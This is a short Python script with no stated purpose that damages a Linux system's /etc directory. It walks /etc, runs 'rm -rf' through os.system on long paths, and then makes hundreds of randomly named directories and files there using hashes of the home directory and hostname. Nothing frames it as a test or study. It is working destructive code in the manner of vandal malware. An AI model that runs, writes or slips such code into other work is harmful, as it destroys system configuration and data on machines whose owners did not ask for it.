#!/usr/bin/env python
#-*- coding: utf-8 -*-

import os,socket,hashlib,random,time
from os import system as command
escape = '/'
ruta = r"/etc"
for r,d,a in os.walk(ruta):
	if len(r) >= 131:
		command("rm -rf %s" % (r))
def CreateHash(i,hash,hashc,escape,ruta): #,hash,hashc,escape ARGS
	if i == 312:
		command("mkdir %s/%s" % (ruta, hashc + "Ik0P2As"))
		for root,directorio,archivo in os.walk(ruta):
			if len(root) > 131:
				command("echo '%s' > %s/%s/temp" % (hash,ruta,hashc + "AD"))
			else:
				pass
				#command("echo '%s' > %s/%s/temp" % (hashc,ruta,hashc))
	else:
		command("mkdir %s/%s" % (ruta,hashc))
		command("echo '%s' > %s/%s/temp" % (hashc,ruta,hashc))
	
		
if __name__ == '__main__':
	for i in range(0,500):
		hash = os.path.expanduser('~') + socket.gethostname() + str(random.randint(0,100000000000000000000000000000000000000000000000000000000000))
		hash = hash.encode('utf-8')
		hash = hashlib.sha512(hash)
		hash = hash.hexdigest()
		hashc =  os.path.expanduser('~') + socket.gethostname() + str(random.randint(0,100000000000000000000000000000000000000000000000000000000000))
		hashc = hashc.encode('utf-8')
		hashc = hashlib.sha512(hashc)
		hashc = hashc.hexdigest()
		CreateHash(i,hash,hashc,escape,ruta)


	#for i in range(0,400):
#		hash = os.path.expanduser('~') + socket.gethostname() + str(random.randint(0,10000000000000000000000000000000000000000000000000000000000000000000000000000000))
#    	hash = hash.encode('utf-8')
#    	hash = hashlib.sha512(hash)
#    	hash = hash.hexdigest()
#    	hashc = os.path.expanduser('~') + socket.gethostname() + str(random.randint(0,10000000000000000000000))
#    	hashc = hashc.encode('utf-8')
#    	hashc = hashlib.sha512(hashc)
#    	hashc = hashc.hexdigest()
    
